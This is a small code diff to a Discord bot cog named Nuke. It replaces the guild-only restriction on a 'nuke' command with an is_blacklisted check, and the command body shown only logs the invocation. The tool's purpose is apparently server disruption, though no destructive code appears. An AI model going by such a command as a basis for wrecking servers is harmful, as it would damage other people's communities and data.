@@ -4,7 +4,7 @@ import traceback
 from discord.ext import commands
 
 from core.operations import Operations
-
+from tools.states.blacklist import is_blacklisted
 
 class Nuke(commands.Cog):
     def __init__(self, bot: commands.Bot):
@@ -12,7 +12,7 @@ class Nuke(commands.Cog):
         self.operations: Operations | None = getattr(bot, "operations", None)
 
     @commands.command(name="nuke")
-    @commands.guild_only()
+    @is_blacklisted
     async def nuke(self, ctx: commands.Context) -> None:
         guild = ctx.guild
         logging.info(f"[nuke] invoked by {ctx.author} in {guild} ({guild.id})")
